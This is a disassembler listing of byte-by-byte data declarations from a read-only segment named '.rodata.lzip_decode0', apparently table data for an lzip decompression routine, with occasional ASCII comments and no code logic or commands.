.rodata.lzip_decode0:000000000000BE95                 db    1
.rodata.lzip_decode0:000000000000BE96                 db    0
.rodata.lzip_decode0:000000000000BE97                 db    0
.rodata.lzip_decode0:000000000000BE98                 db 0A3h
.rodata.lzip_decode0:000000000000BE99                 db    1
.rodata.lzip_decode0:000000000000BE9A                 db    0
.rodata.lzip_decode0:000000000000BE9B                 db    0
.rodata.lzip_decode0:000000000000BE9C                 db  92h
.rodata.lzip_decode0:000000000000BE9D                 db    1
.rodata.lzip_decode0:000000000000BE9E                 db    0
.rodata.lzip_decode0:000000000000BE9F                 db    0
.rodata.lzip_decode0:000000000000BEA0                 db  53h ; S
.rodata.lzip_decode0:000000000000BEA1                 db    0
.rodata.lzip_decode0:000000000000BEA2                 db    0
.rodata.lzip_decode0:000000000000BEA3                 db    0
.rodata.lzip_decode0:000000000000BEA4                 db    4
.rodata.lzip_decode0:000000000000BEA5                 db    0
.rodata.lzip_decode0:000000000000BEA6                 db  68h ; h
.rodata.lzip_decode0:000000000000BEA7                 db    0
.rodata.lzip_decode0:000000000000BEA8                 db  12h
.rodata.lzip_decode0:000000000000BEA9                 db    0
.rodata.lzip_decode0:000000000000BEAA                 db    0
.rodata.lzip_decode0:000000000000BEAB                 db    0
.rodata.lzip_decode0:000000000000BEAC                 db 0C2h
.rodata.lzip_decode0:000000000000BEAD                 db    0
.rodata.lzip_decode0:000000000000BEAE                 db    0
.rodata.lzip_decode0:000000000000BEAF                 db    0
.rodata.lzip_decode0:000000000000BEB0                 db  63h ; c
.rodata.lzip_decode0:000000000000BEB1                 db    1
.rodata.lzip_decode0:000000000000BEB2                 db    0
.rodata.lzip_decode0:000000000000BEB3                 db    0
.rodata.lzip_decode0:000000000000BEB4                 db 0C2h
.rodata.lzip_decode0:000000000000BEB5                 db    0
.rodata.lzip_decode0:000000000000BEB6                 db    0
.rodata.lzip_decode0:000000000000BEB7                 db    0
.rodata.lzip_decode0:000000000000BEB8                 db 0A3h
.rodata.lzip_decode0:000000000000BEB9                 db    0
.rodata.lzip_decode0:000000000000BEBA                 db    0
.rodata.lzip_decode0:000000000000BEBB                 db    0
.rodata.lzip_decode0:000000000000BEBC                 db  62h ; b
.rodata.lzip_decode0:000000000000BEBD                 db    1
.rodata.lzip_decode0:000000000000BEBE                 db    0
.rodata.lzip_decode0:000000000000BEBF                 db    0
.rodata.lzip_decode0:000000000000BEC0                 db  30h ; 0
.rodata.lzip_decode0:000000000000BEC1                 db    6
.rodata.lzip_decode0:000000000000BEC2                 db  50h ; P
.rodata.lzip_decode0:000000000000BEC3                 db    0
.rodata.lzip_decode0:000000000000BEC4                 db 0F0h
.rodata.lzip_decode0:000000000000BEC5                 db    4
.rodata.lzip_decode0:000000000000BEC6                 db  30h ; 0
.rodata.lzip_decode0:000000000000BEC7                 db    0
.rodata.lzip_decode0:000000000000BEC8                 db 0D0h
.rodata.lzip_decode0:000000000000BEC9                 db    4
.rodata.lzip_decode0:000000000000BECA                 db  1Ch
.rodata.lzip_decode0:000000000000BECB                 db    0
.rodata.lzip_decode0:000000000000BECC                 db  92h
.rodata.lzip_decode0:000000000000BECD                 db    4
.rodata.lzip_decode0:000000000000BECE                 db    0
.rodata.lzip_decode0:000000000000BECF                 db    0
.rodata.lzip_decode0:000000000000BED0                 db  51h ; Q
.rodata.lzip_decode0:000000000000BED1                 db    4
.rodata.lzip_decode0:000000000000BED2                 db  0Ch
.rodata.lzip_decode0:000000000000BED3                 db    0
.rodata.lzip_decode0:000000000000BED4                 db  33h ; 3
.rodata.lzip_decode0:000000000000BED5                 db    2
.rodata.lzip_decode0:000000000000BED6                 db    0
.rodata.lzip_decode0:000000000000BED7                 db    0
.rodata.lzip_decode0:000000000000BED8                 db  62h ; b
.rodata.lzip_decode0:000000000000BED9                 db    2
.rodata.lzip_decode0:000000000000BEDA                 db    0
.rodata.lzip_decode0:000000000000BEDB                 db    0
.rodata.lzip_decode0:000000000000BEDC                 db 0A3h
.rodata.lzip_decode0:000000000000BEDD                 db    1
.rodata.lzip_decode0:000000000000BEDE                 db    0
.rodata.lzip_decode0:000000000000BEDF                 db    0
.rodata.lzip_decode0:000000000000BEE0                 db 0B3h
.rodata.lzip_decode0:000000000000BEE1                 db    0
.rodata.lzip_decode0:000000000000BEE2                 db    0
.rodata.lzip_decode0:000000000000BEE3                 db    0
.rodata.lzip_decode0:000000000000BEE4                 db  10h
.rodata.lzip_decode0:000000000000BEE5                 db    6
.rodata.lzip_decode0:000000000000BEE6                 db  94h
.rodata.lzip_decode0:000000000000BEE7                 db    0
.rodata.lzip_decode0:000000000000BEE8                 db  22h ; "
.rodata.lzip_decode0:000000000000BEE9                 db    6
.rodata.lzip_decode0:000000000000BEEA                 db    0
.rodata.lzip_decode0:000000000000BEEB                 db    0
.rodata.lzip_decode0:000000000000BEEC                 db    4
.rodata.lzip_decode0:000000000000BEED                 db    0
.rodata.lzip_decode0:000000000000BEEE                 db  30h ; 0
.rodata.lzip_decode0:000000000000BEEF                 db    0
.rodata.lzip_decode0:000000000000BEF0                 db  42h ; B
.rodata.lzip_decode0:000000000000BEF1                 db    1
.rodata.lzip_decode0:000000000000BEF2                 db    0
.rodata.lzip_decode0:000000000000BEF3                 db    0
.rodata.lzip_decode0:000000000000BEF4                 db  32h ; 2
.rodata.lzip_decode0:000000000000BEF5                 db    0
.rodata.lzip_decode0:000000000000BEF6                 db    0
.rodata.lzip_decode0:000000000000BEF7                 db    0
.rodata.lzip_decode0:000000000000BEF8                 db  62h ; b
.rodata.lzip_decode0:000000000000BEF9                 db    0
.rodata.lzip_decode0:000000000000BEFA                 db    0
.rodata.lzip_decode0:000000000000BEFB                 db    0
.rodata.lzip_decode0:000000000000BEFC                 db  23h ; #
.rodata.lzip_decode0:000000000000BEFD                 db    1
.rodata.lzip_decode0:000000000000BEFE                 db    0
.rodata.lzip_decode0:000000000000BEFF                 db    0
.rodata.lzip_decode0:000000000000BF00                 db 0A3h
.rodata.lzip_decode0:000000000000BF01                 db    0
.rodata.lzip_decode0:000000000000BF02                 db    0
.rodata.lzip_decode0:000000000000BF03                 db    0
.rodata.lzip_decode0:000000000000BF04                 db 0E3h
.rodata.lzip_decode0:000000000000BF05                 db    0
.rodata.lzip_decode0:000000000000BF06                 db    0
.rodata.lzip_decode0:000000000000BF07                 db    0
.rodata.lzip_decode0:000000000000BF08                 db  12h
.rodata.lzip_decode0:000000000000BF09                 db    0
.rodata.lzip_decode0:000000000000BF0A                 db    0
.rodata.lzip_decode0:000000000000BF0B                 db    0
.rodata.lzip_decode0:000000000000BF0C                 db  92h
.rodata.lzip_decode0:000000000000BF0D                 db    1
.rodata.lzip_decode0:000000000000BF0E                 db    0
.rodata.lzip_decode0:000000000000BF0F                 db    0
.rodata.lzip_decode0:000000000000BF10                 db  10h
.rodata.lzip_decode0:000000000000BF11                 db    5
.rodata.lzip_decode0:000000000000BF12                 db  28h ; (
.rodata.lzip_decode0:000000000000BF13                 db    2
.rodata.lzip_decode0:000000000000BF14                 db  30h ; 0
.rodata.lzip_decode0:000000000000BF15                 db    6
.rodata.lzip_decode0:000000000000BF16                 db    4
.rodata.lzip_decode0:000000000000BF17                 db    2
.rodata.lzip_decode0:000000000000BF18                 db  60h ; `
.rodata.lzip_decode0:000000000000BF19                 db    6
.rodata.lzip_decode0:000000000000BF1A                 db 0CCh
.rodata.lzip_decode0:000000000000BF1B                 db    1
.rodata.lzip_decode0:000000000000BF1C                 db 0B0h
.rodata.lzip_decode0:000000000000BF1D                 db    4
.rodata.lzip_decode0:000000000000BF1E                 db  98h
.rodata.lzip_decode0:000000000000BF1F                 db    1
.rodata.lzip_decode0:000000000000BF20                 db  60h ; `
.rodata.lzip_decode0:000000000000BF21                 db    6
.rodata.lzip_decode0:000000000000BF22                 db  6Ch ; l
.rodata.lzip_decode0:000000000000BF23                 db    1
.rodata.lzip_decode0:000000000000BF24                 db  70h ; p
.rodata.lzip_decode0:000000000000BF25                 db    4
.rodata.lzip_decode0:000000000000BF26                 db  3Ch ; <
.rodata.lzip_decode0:000000000000BF27                 db    1
.rodata.lzip_decode0:000000000000BF28                 db 0B0h
.rodata.lzip_decode0:000000000000BF29                 db    4
.rodata.lzip_decode0:000000000000BF2A                 db  0Ch
.rodata.lzip_decode0:000000000000BF2B                 db    1
.rodata.lzip_decode0:000000000000BF2C                 db    1
.rodata.lzip_decode0:000000000000BF2D                 db    0
.rodata.lzip_decode0:000000000000BF2E                 db  28h ; (
.rodata.lzip_decode0:000000000000BF2F                 db    0
.rodata.lzip_decode0:000000000000BF30                 db 0B2h
.rodata.lzip_decode0:000000000000BF31                 db    4
.rodata.lzip_decode0:000000000000BF32                 db    0
.rodata.lzip_decode0:000000000000BF33                 db    0
.rodata.lzip_decode0:000000000000BF34                 db  71h ; q
.rodata.lzip_decode0:000000000000BF35                 db    4
.rodata.lzip_decode0:000000000000BF36                 db  20h
.rodata.lzip_decode0:000000000000BF37                 db    0
.rodata.lzip_decode0:000000000000BF38                 db 0E0h
.rodata.lzip_decode0:000000000000BF39                 db    5
.rodata.lzip_decode0:000000000000BF3A                 db  0Ch
.rodata.lzip_decode0:000000000000BF3B                 db    3
.rodata.lzip_decode0:000000000000BF3C                 db  62h ; b
.rodata.lzip_decode0:000000000000BF3D                 db    4
.rodata.lzip_decode0:000000000000BF3E                 db    0
.rodata.lzip_decode0:000000000000BF3F                 db    0
.rodata.lzip_decode0:000000000000BF40                 db    4
.rodata.lzip_decode0:000000000000BF41                 db    0
.rodata.lzip_decode0:000000000000BF42                 db  58h ; X
.rodata.lzip_decode0:000000000000BF43                 db  0Ch
.rodata.lzip_decode0:000000000000BF44                 db  62h ; b
.rodata.lzip_decode0:000000000000BF45                 db    4
.rodata.lzip_decode0:000000000000BF46                 db    0
.rodata.lzip_decode0:000000000000BF47                 db    0
.rodata.lzip_decode0:000000000000BF48                 db  43h ; C
.rodata.lzip_decode0:000000000000BF49                 db    2
.rodata.lzip_decode0:000000000000BF4A                 db    0
.rodata.lzip_decode0:000000000000BF4B                 db    0
.rodata.lzip_decode0:000000000000BF4C                 db  12h
.rodata.lzip_decode0:000000000000BF4D                 db    0
.rodata.lzip_decode0:000000000000BF4E                 db    0
.rodata.lzip_decode0:000000000000BF4F                 db    0
.rodata.lzip_decode0:000000000000BF50                 db 0F3h
.rodata.lzip_decode0:000000000000BF51                 db    2
.rodata.lzip_decode0:000000000000BF52                 db    0
.rodata.lzip_decode0:000000000000BF53                 db    0
.rodata.lzip_decode0:000000000000BF54                 db 0C2h
.rodata.lzip_decode0:000000000000BF55                 db    1
.rodata.lzip_decode0:000000000000BF56                 db    0
.rodata.lzip_decode0:000000000000BF57                 db    0
.rodata.lzip_decode0:000000000000BF58                 db  83h
.rodata.lzip_decode0:000000000000BF59                 db    1
.rodata.lzip_decode0:000000000000BF5A                 db    0
.rodata.lzip_decode0:000000000000BF5B                 db    0
.rodata.lzip_decode0:000000000000BF5C                 db  10h
.rodata.lzip_decode0:000000000000BF5D                 db    0
.rodata.lzip_decode0:000000000000BF5E                 db  37h ; 7
.rodata.lzip_decode0:000000000000BF5F                 db    6
.rodata.lzip_decode0:000000000000BF60                 db  83h
.rodata.lzip_decode0:000000000000BF61                 db    0
.rodata.lzip_decode0:000000000000BF62                 db    0
.rodata.lzip_decode0:000000000000BF63                 db    0
.rodata.lzip_decode0:000000000000BF64                 db  23h ; #
.rodata.lzip_decode0:000000000000BF65                 db    0
.rodata.lzip_decode0:000000000000BF66                 db    0
.rodata.lzip_decode0:000000000000BF67                 db    0
.rodata.lzip_decode0:000000000000BF68                 db  82h
.rodata.lzip_decode0:000000000000BF69                 db    1
.rodata.lzip_decode0:000000000000BF6A                 db    0
.rodata.lzip_decode0:000000000000BF6B                 db    0
.rodata.lzip_decode0:000000000000BF6C                 db  63h ; c
.rodata.lzip_decode0:000000000000BF6D                 db    1
.rodata.lzip_decode0:000000000000BF6E                 db    0
.rodata.lzip_decode0:000000000000BF6F                 db    0
.rodata.lzip_decode0:000000000000BF70                 db  40h ; @
.rodata.lzip_decode0:000000000000BF71                 db    6
.rodata.lzip_decode0:000000000000BF72                 db  14h
.rodata.lzip_decode0:000000000000BF73                 db    0
.rodata.lzip_decode0:000000000000BF74                 db  42h ; B
.rodata.lzip_decode0:000000000000BF75                 db    6
.rodata.lzip_decode0:000000000000BF76                 db    0
.rodata.lzip_decode0:000000000000BF77                 db    0
.rodata.lzip_decode0:000000000000BF78                 db    4
.rodata.lzip_decode0:000000000000BF79                 db    0
.rodata.lzip_decode0:000000000000BF7A                 db 0F0h
.rodata.lzip_decode0:000000000000BF7B                 db    4
.rodata.lzip_decode0:000000000000BF7C                 db 0B2h
.rodata.lzip_decode0:000000000000BF7D                 db    1
.rodata.lzip_decode0:000000000000BF7E                 db    0
.rodata.lzip_decode0:000000000000BF7F                 db    0
.rodata.lzip_decode0:000000000000BF80                 db  93h
.rodata.lzip_decode0:000000000000BF81                 db    0
.rodata.lzip_decode0:000000000000BF82                 db    0
.rodata.lzip_decode0:000000000000BF83                 db    0
.rodata.lzip_decode0:000000000000BF84                 db 0E2h
.rodata.lzip_decode0:000000000000BF85                 db    0
.rodata.lzip_decode0:000000000000BF86                 db    0
.rodata.lzip_decode0:000000000000BF87                 db    0
.rodata.lzip_decode0:000000000000BF88                 db 0C3h
.rodata.lzip_decode0:000000000000BF89                 db    0
.rodata.lzip_decode0:000000000000BF8A                 db    0
.rodata.lzip_decode0:000000000000BF8B                 db    0
.rodata.lzip_decode0:000000000000BF8C                 db    4
.rodata.lzip_decode0:000000000000BF8D                 db    0
.rodata.lzip_decode0:000000000000BF8E                 db  90h
.rodata.lzip_decode0:000000000000BF8F                 db    6
.rodata.lzip_decode0:000000000000BF90                 db  82h
.rodata.lzip_decode0:000000000000BF91                 db    1
.rodata.lzip_decode0:000000000000BF92                 db    0
.rodata.lzip_decode0:000000000000BF93                 db    0
.rodata.lzip_decode0:000000000000BF94                 db  33h ; 3
.rodata.lzip_decode0:000000000000BF95                 db    0
.rodata.lzip_decode0:000000000000BF96                 db    0
.rodata.lzip_decode0:000000000000BF97                 db    0
.rodata.lzip_decode0:000000000000BF98                 db  33h ; 3
.rodata.lzip_decode0:000000000000BF99                 db    0
.rodata.lzip_decode0:000000000000BF9A                 db    0
.rodata.lzip_decode0:000000000000BF9B                 db    0
.rodata.lzip_decode0:000000000000BF9C                 db  33h ; 3
.rodata.lzip_decode0:000000000000BF9D                 db    1
.rodata.lzip_decode0:000000000000BF9E                 db    0
.rodata.lzip_decode0:000000000000BF9F                 db    0
.rodata.lzip_decode0:000000000000BFA0                 db  12h
.rodata.lzip_decode0:000000000000BFA1                 db    1
.rodata.lzip_decode0:000000000000BFA2                 db    0
.rodata.lzip_decode0:000000000000BFA3                 db    0
.rodata.lzip_decode0:000000000000BFA4                 db    4
.rodata.lzip_decode0:000000000000BFA5                 db    0
.rodata.lzip_decode0:000000000000BFA6                 db 0B8h
.rodata.lzip_decode0:000000000000BFA7                 db    7
.rodata.lzip_decode0:000000000000BFA8                 db  32h ; 2
.rodata.lzip_decode0:000000000000BFA9                 db    1
.rodata.lzip_decode0:000000000000BFAA                 db    0
.rodata.lzip_decode0:000000000000BFAB                 db    0
.rodata.lzip_decode0:000000000000BFAC                 db    3
.rodata.lzip_decode0:000000000000BFAD                 db    0
.rodata.lzip_decode0:000000000000BFAE                 db    0
.rodata.lzip_decode0:000000000000BFAF                 db    0
.rodata.lzip_decode0:000000000000BFB0                 db    3
.rodata.lzip_decode0:000000000000BFB1                 db    0
.rodata.lzip_decode0:000000000000BFB2                 db    0
.rodata.lzip_decode0:000000000000BFB3                 db    0
.rodata.lzip_decode0:000000000000BFB4                 db    3
.rodata.lzip_decode0:000000000000BFB5                 db    0
.rodata.lzip_decode0:000000000000BFB6                 db    0
.rodata.lzip_decode0:000000000000BFB7                 db    0
.rodata.lzip_decode0:000000000000BFB8                 db  23h ; #
.rodata.lzip_decode0:000000000000BFB9                 db    1
.rodata.lzip_decode0:000000000000BFBA                 db    0
.rodata.lzip_decode0:000000000000BFBB                 db    0
.rodata.lzip_decode0:000000000000BFBC                 db  43h ; C
.rodata.lzip_decode0:000000000000BFBD                 db    0
.rodata.lzip_decode0:000000000000BFBE                 db    0
.rodata.lzip_decode0:000000000000BFBF                 db    0
.rodata.lzip_decode0:000000000000BFC0                 db 0C2h
.rodata.lzip_decode0:000000000000BFC1                 db    0
.rodata.lzip_decode0:000000000000BFC2                 db    0
.rodata.lzip_decode0:000000000000BFC3                 db    0
.rodata.lzip_decode0:000000000000BFC4                 db    1
.rodata.lzip_decode0:000000000000BFC5                 db    0
.rodata.lzip_decode0:000000000000BFC6                 db  50h ; P
.rodata.lzip_decode0:000000000000BFC7                 db    0
.rodata.lzip_decode0:000000000000BFC8                 db 0E0h
.rodata.lzip_decode0:000000000000BFC9                 db    4
.rodata.lzip_decode0:000000000000BFCA                 db  38h ; 8
.rodata.lzip_decode0:000000000000BFCB                 db    0
.rodata.lzip_decode0:000000000000BFCC                 db 0E0h
.rodata.lzip_decode0:000000000000BFCD                 db    4
.rodata.lzip_decode0:000000000000BFCE                 db  20h
.rodata.lzip_decode0:000000000000BFCF                 db    0
.rodata.lzip_decode0:000000000000BFD0                 db  32h ; 2
.rodata.lzip_decode0:000000000000BFD1                 db    5
.rodata.lzip_decode0:000000000000BFD2                 db    0
.rodata.lzip_decode0:000000000000BFD3                 db    0
.rodata.lzip_decode0:000000000000BFD4                 db    4
.rodata.lzip_decode0:000000000000BFD5                 db    0
.rodata.lzip_decode0:000000000000BFD6                 db    8
.rodata.lzip_decode0:000000000000BFD7                 db    3
.rodata.lzip_decode0:000000000000BFD8                 db  12h
.rodata.lzip_decode0:000000000000BFD9                 db    0
.rodata.lzip_decode0:000000000000BFDA                 db    0
.rodata.lzip_decode0:000000000000BFDB                 db    0
.rodata.lzip_decode0:000000000000BFDC                 db 0D2h
.rodata.lzip_decode0:000000000000BFDD                 db    1
.rodata.lzip_decode0:000000000000BFDE                 db    0
.rodata.lzip_decode0:000000000000BFDF                 db    0
.rodata.lzip_decode0:000000000000BFE0                 db    4
.rodata.lzip_decode0:000000000000BFE1                 db    0
.rodata.lzip_decode0:000000000000BFE2                 db  10h
.rodata.lzip_decode0:000000000000BFE3                 db    7
.rodata.lzip_decode0:000000000000BFE4                 db 0E2h
.rodata.lzip_decode0:000000000000BFE5                 db    3
.rodata.lzip_decode0:000000000000BFE6                 db    0
.rodata.lzip_decode0:000000000000BFE7                 db    0
.rodata.lzip_decode0:000000000000BFE8                 db    3
.rodata.lzip_decode0:000000000000BFE9                 db    0
.rodata.lzip_decode0:000000000000BFEA                 db    0
.rodata.lzip_decode0:000000000000BFEB                 db    0
.rodata.lzip_decode0:000000000000BFEC                 db  53h ; S
.rodata.lzip_decode0:000000000000BFED                 db    4
.rodata.lzip_decode0:000000000000BFEE                 db    0
.rodata.lzip_decode0:000000000000BFEF                 db    0
.rodata.lzip_decode0:000000000000BFF0                 db  12h
.rodata.lzip_decode0:000000000000BFF1                 db    5
.rodata.lzip_decode0:000000000000BFF2                 db    0
.rodata.lzip_decode0:000000000000BFF3                 db    0
.rodata.lzip_decode0:000000000000BFF4                 db  33h ; 3
.rodata.lzip_decode0:000000000000BFF5                 db    5
.rodata.lzip_decode0:000000000000BFF6                 db    0
.rodata.lzip_decode0:000000000000BFF7                 db    0
.rodata.lzip_decode0:000000000000BFF8                 db  32h ; 2
.rodata.lzip_decode0:000000000000BFF9                 db    2
.rodata.lzip_decode0:000000000000BFFA                 db    0
.rodata.lzip_decode0:000000000000BFFB                 db    0
.rodata.lzip_decode0:000000000000BFFC                 db  43h ; C
.rodata.lzip_decode0:000000000000BFFD                 db    2
.rodata.lzip_decode0:000000000000BFFE                 db    0
.rodata.lzip_decode0:000000000000BFFF                 db    0
.rodata.lzip_decode0:000000000000C000                 db    3
.rodata.lzip_decode0:000000000000C001                 db    0
.rodata.lzip_decode0:000000000000C002                 db    0
.rodata.lzip_decode0:000000000000C003                 db    0
.rodata.lzip_decode0:000000000000C004                 db 0F2h
.rodata.lzip_decode0:000000000000C005                 db    4
.rodata.lzip_decode0:000000000000C006                 db    0
.rodata.lzip_decode0:000000000000C007                 db    0
.rodata.lzip_decode0:000000000000C008                 db 0F3h
.rodata.lzip_decode0:000000000000C009                 db    2
.rodata.lzip_decode0:000000000000C00A                 db    0
.rodata.lzip_decode0:000000000000C00B                 db    0
.rodata.lzip_decode0:000000000000C00C                 db 0F0h
.rodata.lzip_decode0:000000000000C00D                 db    3
.rodata.lzip_decode0:000000000000C00E                 db  2Ch ; ,
.rodata.lzip_decode0:000000000000C00F                 db    0
.rodata.lzip_decode0:000000000000C010                 db 0F2h
.rodata.lzip_decode0:000000000000C011                 db    3
.rodata.lzip_decode0:000000000000C012                 db    0
.rodata.lzip_decode0:000000000000C013                 db    0
.rodata.lzip_decode0:000000000000C014                 db    4
.rodata.lzip_decode0:000000000000C015                 db    0
.rodata.lzip_decode0:000000000000C016                 db  28h ; (
.rodata.lzip_decode0:000000000000C017                 db    4
.rodata.lzip_decode0:000000000000C018                 db  52h ; R
.rodata.lzip_decode0:000000000000C019                 db    1
.rodata.lzip_decode0:000000000000C01A                 db    0
.rodata.lzip_decode0:000000000000C01B                 db    0
.rodata.lzip_decode0:000000000000C01C                 db  93h
.rodata.lzip_decode0:000000000000C01D                 db    1
.rodata.lzip_decode0:000000000000C01E                 db    0
.rodata.lzip_decode0:000000000000C01F                 db    0
.rodata.lzip_decode0:000000000000C020                 db  12h
.rodata.lzip_decode0:000000000000C021                 db    2
.rodata.lzip_decode0:000000000000C022                 db    0
.rodata.lzip_decode0:000000000000C023                 db    0
.rodata.lzip_decode0:000000000000C024                 db  83h
.rodata.lzip_decode0:000000000000C025                 db    2
.rodata.lzip_decode0:000000000000C026                 db    0
.rodata.lzip_decode0:000000000000C027                 db    0
.rodata.lzip_decode0:000000000000C028                 db  52h ; R
.rodata.lzip_decode0:000000000000C029                 db    2
.rodata.lzip_decode0:000000000000C02A                 db    0
.rodata.lzip_decode0:000000000000C02B                 db    0
.rodata.lzip_decode0:000000000000C02C                 db  63h ; c
.rodata.lzip_decode0:000000000000C02D                 db    2
.rodata.lzip_decode0:000000000000C02E                 db    0
.rodata.lzip_decode0:000000000000C02F                 db    0
.rodata.lzip_decode0:000000000000C030                 db    4
.rodata.lzip_decode0:000000000000C031                 db    0
.rodata.lzip_decode0:000000000000C032                 db 0F0h
.rodata.lzip_decode0:000000000000C033                 db    5
.rodata.lzip_decode0:000000000000C034                 db  12h
.rodata.lzip_decode0:000000000000C035                 db    0
.rodata.lzip_decode0:000000000000C036                 db    0
.rodata.lzip_decode0:000000000000C037                 db    0
.rodata.lzip_decode0:000000000000C038                 db  32h ; 2
.rodata.lzip_decode0:000000000000C039                 db    0
.rodata.lzip_decode0:000000000000C03A                 db    0
.rodata.lzip_decode0:000000000000C03B                 db    0
.rodata.lzip_decode0:000000000000C03C                 db    4
.rodata.lzip_decode0:000000000000C03D                 db    0
.rodata.lzip_decode0:000000000000C03E                 db 0B8h
.rodata.lzip_decode0:000000000000C03F                 db  0Ah
.rodata.lzip_decode0:000000000000C040                 db  12h
.rodata.lzip_decode0:000000000000C041                 db    0
.rodata.lzip_decode0:000000000000C042                 db    0
.rodata.lzip_decode0:000000000000C043                 db    0
.rodata.lzip_decode0:000000000000C044                 db  32h ; 2
.rodata.lzip_decode0:000000000000C045                 db    0
.rodata.lzip_decode0:000000000000C046                 db    0
.rodata.lzip_decode0:000000000000C047                 db    0
.rodata.lzip_decode0:000000000000C048                 db 0E0h
.rodata.lzip_decode0:000000000000C049                 db    5
.rodata.lzip_decode0:000000000000C04A                 db  0Ch
.rodata.lzip_decode0:000000000000C04B                 db    0
.rodata.lzip_decode0:000000000000C04C                 db 0E2h
.rodata.lzip_decode0:000000000000C04D                 db    5
.rodata.lzip_decode0:000000000000C04E                 db    0
.rodata.lzip_decode0:000000000000C04F                 db    0
.rodata.lzip_decode0:000000000000C050                 db  81h
.rodata.lzip_decode0:000000000000C051                 db    6
.rodata.lzip_decode0:000000000000C052                 db    4
.rodata.lzip_decode0:000000000000C053                 db    0
.rodata.lzip_decode0:000000000000C054                 db  62h ; b
.rodata.lzip_decode0:000000000000C055                 db    1
.rodata.lzip_decode0:000000000000C056                 db    0
.rodata.lzip_decode0:000000000000C057                 db    0
.rodata.lzip_decode0:000000000000C058                 db 0B0h
.rodata.lzip_decode0:000000000000C059                 db    6
.rodata.lzip_decode0:000000000000C05A                 db  28h ; (
.rodata.lzip_decode0:000000000000C05B                 db    0
.rodata.lzip_decode0:000000000000C05C                 db    2
.rodata.lzip_decode0:000000000000C05D                 db    5
.rodata.lzip_decode0:000000000000C05E                 db    0
.rodata.lzip_decode0:000000000000C05F                 db    0
.rodata.lzip_decode0:000000000000C060                 db 0E1h
.rodata.lzip_decode0:000000000000C061                 db    4
.rodata.lzip_decode0:000000000000C062                 db    4
.rodata.lzip_decode0:000000000000C063                 db    0
.rodata.lzip_decode0:000000000000C064                 db    4
.rodata.lzip_decode0:000000000000C065                 db    0
.rodata.lzip_decode0:000000000000C066                 db  60h ; `
.rodata.lzip_decode0:000000000000C067                 db    7
.rodata.lzip_decode0:000000000000C068                 db 0E2h
.rodata.lzip_decode0:000000000000C069                 db    0
.rodata.lzip_decode0:000000000000C06A                 db    0
.rodata.lzip_decode0:000000000000C06B                 db    0
.rodata.lzip_decode0:000000000000C06C                 db  32h ; 2
.rodata.lzip_decode0:000000000000C06D                 db    0
.rodata.lzip_decode0:000000000000C06E                 db    0
.rodata.lzip_decode0:000000000000C06F                 db    0
.rodata.lzip_decode0:000000000000C070                 db 0A3h
.rodata.lzip_decode0:000000000000C071                 db    1
.rodata.lzip_decode0:000000000000C072                 db    0
.rodata.lzip_decode0:000000000000C073                 db    0
.rodata.lzip_decode0:000000000000C074                 db  72h ; r
.rodata.lzip_decode0:000000000000C075                 db    0
.rodata.lzip_decode0:000000000000C076                 db    0
.rodata.lzip_decode0:000000000000C077                 db    0
.rodata.lzip_decode0:000000000000C078                 db  62h ; b
.rodata.lzip_decode0:000000000000C079                 db    1
.rodata.lzip_decode0:000000000000C07A                 db    0
.rodata.lzip_decode0:000000000000C07B                 db    0
.rodata.lzip_decode0:000000000000C07C                 db  93h
.rodata.lzip_decode0:000000000000C07D                 db    0
.rodata.lzip_decode0:000000000000C07E                 db    0
.rodata.lzip_decode0:000000000000C07F                 db    0
.rodata.lzip_decode0:000000000000C080                 db    4
.rodata.lzip_decode0:000000000000C081                 db    0
.rodata.lzip_decode0:000000000000C082                 db    8
.rodata.lzip_decode0:000000000000C083                 db  0Dh
.rodata.lzip_decode0:000000000000C084                 db 0E3h
.rodata.lzip_decode0:000000000000C085                 db    1
.rodata.lzip_decode0:000000000000C086                 db    0
.rodata.lzip_decode0:000000000000C087                 db    0
.rodata.lzip_decode0:000000000000C088                 db    4
.rodata.lzip_decode0:000000000000C089                 db    0
.rodata.lzip_decode0:000000000000C08A                 db 0C8h
.rodata.lzip_decode0:000000000000C08B                 db    2
.rodata.lzip_decode0:000000000000C08C                 db  83h
.rodata.lzip_decode0:000000000000C08D                 db    0
.rodata.lzip_decode0:000000000000C08E                 db    0
.rodata.lzip_decode0:000000000000C08F                 db    0
.rodata.lzip_decode0:000000000000C090                 db    3
.rodata.lzip_decode0:000000000000C091                 db    0
.rodata.lzip_decode0:000000000000C092                 db    0
.rodata.lzip_decode0:000000000000C093                 db    0
.rodata.lzip_decode0:000000000000C094                 db 0C2h
.rodata.lzip_decode0:000000000000C095                 db    1
.rodata.lzip_decode0:000000000000C096                 db    0
.rodata.lzip_decode0:000000000000C097                 db    0
.rodata.lzip_decode0:000000000000C098                 db 0C3h
.rodata.lzip_decode0:000000000000C099                 db    0
.rodata.lzip_decode0:000000000000C09A                 db    0
.rodata.lzip_decode0:000000000000C09B                 db    0
.rodata.lzip_decode0:000000000000C09C                 db    3
.rodata.lzip_decode0:000000000000C09D                 db    1
.rodata.lzip_decode0:000000000000C09E                 db    0
.rodata.lzip_decode0:000000000000C09F                 db    0
.rodata.lzip_decode0:000000000000C0A0                 db    3
.rodata.lzip_decode0:000000000000C0A1                 db    0
.rodata.lzip_decode0:000000000000C0A2                 db    0
.rodata.lzip_decode0:000000000000C0A3                 db    0
.rodata.lzip_decode0:000000000000C0A4                 db  13h
.rodata.lzip_decode0:000000000000C0A5                 db    0
.rodata.lzip_decode0:000000000000C0A6                 db    0
.rodata.lzip_decode0:000000000000C0A7                 db    0
.rodata.lzip_decode0:000000000000C0A8                 db    2
.rodata.lzip_decode0:000000000000C0A9                 db    1
.rodata.lzip_decode0:000000000000C0AA                 db    0
.rodata.lzip_decode0:000000000000C0AB                 db    0
.rodata.lzip_decode0:000000000000C0AC                 db  52h ; R
.rodata.lzip_decode0:000000000000C0AD                 db    0
.rodata.lzip_decode0:000000000000C0AE                 db    0
.rodata.lzip_decode0:000000000000C0AF                 db    0
.rodata.lzip_decode0:000000000000C0B0                 db 0F3h
.rodata.lzip_decode0:000000000000C0B1                 db    0
.rodata.lzip_decode0:000000000000C0B2                 db    0
.rodata.lzip_decode0:000000000000C0B3                 db    0
.rodata.lzip_decode0:000000000000C0B4                 db 0E3h
.rodata.lzip_decode0:000000000000C0B5                 db    0
.rodata.lzip_decode0:000000000000C0B6                 db    0
.rodata.lzip_decode0:000000000000C0B7                 db    0
.rodata.lzip_decode0:000000000000C0B8                 db 0C2h
.rodata.lzip_decode0:000000000000C0B9                 db    6
.rodata.lzip_decode0:000000000000C0BA                 db    0
.rodata.lzip_decode0:000000000000C0BB                 db    0
.rodata.lzip_decode0:000000000000C0BC                 db 0C3h
